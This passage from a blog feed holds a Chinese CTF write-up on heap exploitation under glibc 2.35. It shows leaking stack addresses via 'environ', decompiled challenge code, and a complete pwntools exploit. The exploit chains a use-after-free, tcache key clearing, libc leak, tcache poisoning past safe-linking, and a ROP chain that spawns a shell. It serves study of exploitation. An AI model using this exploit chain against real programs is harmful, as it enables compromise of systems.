r3t2’s blog</a>)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> largebin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc位于栈上的chunk</title>
      <link href="/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/"/>
      <url>/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Background"><a href="#0x00-Background" class="headerlink" title="0x00 Background"></a>0x00 Background</h2><p>笔者打nssctf上的一题打了两天才通，收获颇多，记录一下。<br>pwn攻击不应该孤立的看。换句话说，要无所不用其极，哪种攻击好使就用哪种。现在就来浅浅分析一下在堆中对栈的攻击。（手法很多，后面慢慢学慢慢补充吧<br></p><h2 id="0x01-利用environ变量"><a href="#0x01-利用environ变量" class="headerlink" title="0x01 利用environ变量"></a>0x01 利用environ变量</h2><p>以下调试以[NSSRound#21Basic]want_girlfriend（glibc2.35）的程序来演示。<br>在linux环境下，程序存在一个全局变量<code>(char**)environ</code>，位于libc数据段，与libcbase存在固定偏移<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_addr=libcbase+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br></pre></td></tr></table></figure><p><code>environ</code>指向一个指针数组，数组中每个指针指向一个环境变量字符串，而环境变量字符串是位于栈区的。<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$1 = (&lt;data variable, no debug info&gt; *) 0x7ffff7e22200 &lt;environ&gt;</span><br><span class="line">pwndbg&gt; x/gx 0x7ffff7e22200</span><br><span class="line">0x7ffff7e22200 &lt;environ&gt;:       0x00007fffffffdfb8</span><br></pre></td></tr></table></figure><p>这样我们知道了<code>environ</code>的值，我们到栈区看看<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2e:0170│+148 0x7fffffffdfb8 —▸ 0x7fffffffe27b ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">2f:0178│+150 0x7fffffffdfc0 —▸ 0x7fffffffe28b ◂— &#x27;WSL2_GUI_APPS_ENABLED=1&#x27;</span><br><span class="line">30:0180│+158 0x7fffffffdfc8 —▸ 0x7fffffffe2a3 ◂— &#x27;WSL_DISTRO_NAME=Ubuntu-22.04&#x27;</span><br><span class="line">31:0188│+160 0x7fffffffdfd0 —▸ 0x7fffffffe2c0 ◂— &#x27;WT_SESSION=1c2e66a8-92b1-4c76-b525-e18b94cf4188&#x27;</span><br><span class="line">32:0190│+168 0x7fffffffdfd8 —▸ 0x7fffffffe2f0 ◂— &#x27;NAME=LAPTOP-6JKPOVPE&#x27;</span><br><span class="line">33:0198│+170 0x7fffffffdfe0 —▸ 0x7fffffffe305 ◂— &#x27;PWD=/home/turing/girlfriend&#x27;</span><br><span class="line">34:01a0│+178 0x7fffffffdfe8 —▸ 0x7fffffffe321 ◂— &#x27;LOGNAME=turing&#x27;</span><br><span class="line">35:01a8│+180 0x7fffffffdff0 —▸ 0x7fffffffe330 ◂— &#x27;_=/usr/bin/gdb&#x27;</span><br><span class="line">36:01b0│+188 0x7fffffffdff8 —▸ 0x7fffffffe33f ◂— &#x27;LINES=40&#x27;</span><br><span class="line">37:01b8│+190 0x7fffffffe000 —▸ 0x7fffffffe348 ◂— &#x27;HOME=/home/turing&#x27;</span><br><span class="line">38:01c0│+198 0x7fffffffe008 —▸ 0x7fffffffe35a ◂— &#x27;LANG=C.UTF-8&#x27;</span><br><span class="line">39:01c8│+1a0 0x7fffffffe010 —▸ 0x7fffffffe367 ◂— &#x27;WSL_INTEROP=/run/WSL/398_interop&#x27;</span><br><span class="line">3a:01d0│+1a8 0x7fffffffe018 —▸ 0x7fffffffe388 ◂— 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)</span><br><span class="line">3b:01d8│+1b0 0x7fffffffe020 —▸ 0x7fffffffe977 ◂— &#x27;COLUMNS=144&#x27;</span><br></pre></td></tr></table></figure><p>发现0x00007fffffffdfb8正是指向栈上的环境变量的二级指针。且环境变量指针数组也是位于栈上的。那么我们便可以通过泄露<code>environ</code>的值来泄露栈地址了。<br>我们在<code>main</code>下个断点，然后查看<code>main</code>函数的返回地址处<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rbp rsp 0x7fffffffde90 ◂— 1</span><br><span class="line">01:0008│+008     0x7fffffffde98 —▸ 0x7ffff7c29d90 ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p>在<code>rbp+0x08</code>处，正是在0x7fffffffde98。显然其与<code>environ</code>的值的偏移是固定的，其他函数同样如此。这样我们便可以利用泄露的environ地址来对函数返回地址进行读写，来进行我们熟悉的ROP操作劫持程序执行流。<br></p><h2 id="0x02-利用残留的栈上数据"><a href="#0x02-利用残留的栈上数据" class="headerlink" title="0x02 利用残留的栈上数据"></a>0x02 利用残留的栈上数据</h2><p>当程序从栈区向堆区复制数据时候，可能会将栈上残留的栈地址带入堆区。<br>例如，<code>strcpy()</code>函数，无长度检查，遇到<code>\x00</code>停止复制，如果程序从栈上buf区向chunk复制数据，我们向buf输入非<code>\x00</code>数据，经过调试来将栈上地址copy到chunk中。<br>先鸽，咕咕<br></p><h2 id="0x03-利用-IO-FILE"><a href="#0x03-利用-IO-FILE" class="headerlink" title="0x03 利用_IO_FILE"></a>0x03 利用_IO_FILE</h2><p>先鸽，咕咕<br></p><h2 id="0x04-NSSRound-21Basic-want-girlfriend"><a href="#0x04-NSSRound-21Basic-want-girlfriend" class="headerlink" title="0x04 [NSSRound#21Basic]want_girlfriend"></a>0x04 [NSSRound#21Basic]want_girlfriend</h2><p>菜单题64位保护全开，先放题目各选项源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">creat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no,You can only have one girlfriend!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please input her height:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">140</span> &amp;&amp; v1 &lt;= <span class="number">259</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Are you sure???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    new = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( !new )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input her name&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x10u</span>LL);</span><br><span class="line">    <span class="built_in">strcpy</span>(new, buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Plese input her describe&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">    <span class="built_in">strcpy</span>(new + <span class="number">16</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)++flag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先read到栈上再strcpy到chunk。限制size为140-259.用flag记录chunk数量，只允许flag小于1时申请chunk。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your girlfriend is &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, new, <span class="number">0x10u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;she is &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, new + <span class="number">16</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v0 = *((_QWORD *)new + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your love: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, new + <span class="number">48</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">    LODWORD(v0) = <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用write打印堆上数据，不用担心<code>\x00</code>截断（喜），同时可以打印chunk+0x30处数据。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">abandon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure you want to abandon her now???&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="number">89</span> )</span><br><span class="line">    <span class="built_in">free</span>(new);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you leave, I will life and death dependency.&quot;</span>);</span><br><span class="line">  --flag;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free没有清指针，可以uaf，且不检查double free。还可以不free任何chunk。flag自减。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">love</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !new )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you abandon her, the best love is forgetting&quot;</span>);</span><br><span class="line">    *(_QWORD *)new = <span class="number">0LL</span>;</span><br><span class="line">    *((_QWORD *)new + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">    result = (_DWORD)new + <span class="number">16</span>;</span><br><span class="line">    *((_QWORD *)new + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input your love&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, new + <span class="number">56</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当flag小于等于0时可以将chunk内前0x18全部置0。flag&gt;0时可以向chunk的mem+0x38处写数据。<br>到这里笔者起初是想劫持<code>tcache_perthread_struct</code>，但此题是高版本glibc2.35，counts数组较长（0x80），我们的可写数据的chunk区域只有creat函数提供的的前0x30，以及love函数提供的mem+0x38到mem+0x58处。无法写到<code>tcache-&gt;entries</code>数组。<br>但是笔者又设想可以修改counts数组来方便的将chunk投入unsorted bin来泄露libc。但是在具体操作时总是失败。因为可写区域的限制，修改不到0x290size的chunk（也就是<code>tcache_perthread_struct</code>）对应的counts数组元素。而如果要为其他size的chunk改写counts成员，来伪装填满tcachebins，又需要额外申请chunk。还不如直接连续free七次来简单粗暴的填满tcache。<br>在此版本中有<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/"><code>tcache-&gt;key</code>来防御double free</a>，但是注意到love函数可以将chunk清零来破坏key字段，可行。于是就可以将chunk投入unsorted bin来泄露libc。这里注意，只有<code>tcache-&gt;counts</code>中的数据大于0时才能从对应tcachebin中申请到chunk，所以double free 的时候我们要多free一次。<br>然后glibc2.35，第一时间想到接着打tcache。可以进行tcache poisoning，存在<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">safe-linking</a>，但也可以绕过，那么任意地址读写实现了，接着如果getshell呢？由于hooks的移除，那么攻击面进一步缩小。笔者这里自然也是想到了打ROP（个中艰辛不足道也）。既然要打ROP，栈上地址可以通过environ变量泄露。后来看其他师傅的wp，发现也可以利用<code>strcpy()</code>来带出栈上地址。<br>同时考虑到canary，再去绕过canary的话就太累了，我们很快发现love函数并没有canary，可以覆盖love函数的返回地址。然后rop链可以用love函数注入<br>ok分析完毕，直接放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28949</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./[NSSRound21Basic]want_girlfriend&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./[NSSRound21Basic]want_girlfriend&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,content1,content2</span>): <span class="comment">#content1:0x10 content2:0x20 content1-&gt;new content2-&gt;new+0x10</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;height:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;name\n&#x27;</span>,content1)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;describe\n&#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;now???\n&#x27;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;now???\n&#x27;</span>,<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(): <span class="comment">#new(0x10) new+0x10(0x20) if(new+0x30) new+0x30(0x20)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">love_inject</span>(<span class="params">content</span>): <span class="comment">#content 0x20 new+0x38</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;520&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;love\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">love_destory_key</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: \n&#x27;</span>,<span class="string">b&#x27;520&#x27;</span>)</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x90</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free() <span class="comment">#0</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Your girlfriend is &quot;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xc0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free() <span class="comment">#0</span></span><br><span class="line">creat(<span class="number">0x90</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free()</span><br><span class="line">    love_destory_key()</span><br><span class="line">free() <span class="comment"># in unsortedbin flag=-6</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Your girlfriend is &quot;</span>)</span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span> <span class="comment">#main_arena与unsortedbin的偏移在高版本为96</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libcbase=main_arena-<span class="number">0x21ac80</span> <span class="comment">#ida分析给出的libc.so.6中的malloc_trim函数中得到偏移</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget_offset=0xebc81 #最初眼花了以为got表可写，还想打one_gadget(</span></span><br><span class="line"><span class="comment">#getshell=libcbase+onegadget_offset</span></span><br><span class="line"></span><br><span class="line">environ_add=libcbase+libc.sym[<span class="string">&quot;environ&quot;</span>] <span class="comment">#offset with love return = 0x140,调试得到</span></span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xb0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-5</span></span><br><span class="line">free() <span class="comment">#-6</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-7</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-8 只有tcache-&gt;counts中的数据大于0时才能从对应tcachebin中申请到chunk，所以double free的时候我们要多free一次 </span></span><br><span class="line">creat(<span class="number">0xb0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(environ_add-<span class="number">0x30</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-7</span></span><br><span class="line">creat(<span class="number">0xb0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(environ_add-<span class="number">0x30</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-6</span></span><br><span class="line">creat(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#-5 (environ-0x30) chunk</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your love: &#x27;</span>)</span><br><span class="line">love_ret=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x140</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(love_ret))</span><br><span class="line"></span><br><span class="line">sh_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_ret=libcbase+<span class="number">0x02a3e5</span></span><br><span class="line">ret=libcbase+<span class="number">0x029139</span></span><br><span class="line"></span><br><span class="line">creat(<span class="number">0xa0</span>,<span class="string">b&#x27;w&#x27;</span>,<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-4</span></span><br><span class="line">free() <span class="comment">#-5</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-6</span></span><br><span class="line">love_destory_key()</span><br><span class="line">free() <span class="comment">#-7</span></span><br><span class="line">creat(<span class="number">0xa0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(love_ret-<span class="number">0x38</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-6</span></span><br><span class="line">creat(<span class="number">0xa0</span>,p64((heap_base&gt;&gt;<span class="number">12</span>)^(love_ret-<span class="number">0x38</span>)),<span class="string">b&#x27;w&#x27;</span>) <span class="comment">#-5</span></span><br><span class="line">rop_chain=p64(ret)+p64(pop_rdi_ret)+p64(sh_add)+p64(sys_add)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    creat(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">creat(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">love_inject(rop_chain)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同版本下glibc有关堆的管理和保护</title>
      <link href="/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/"/>
      <url>/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/</url>
      
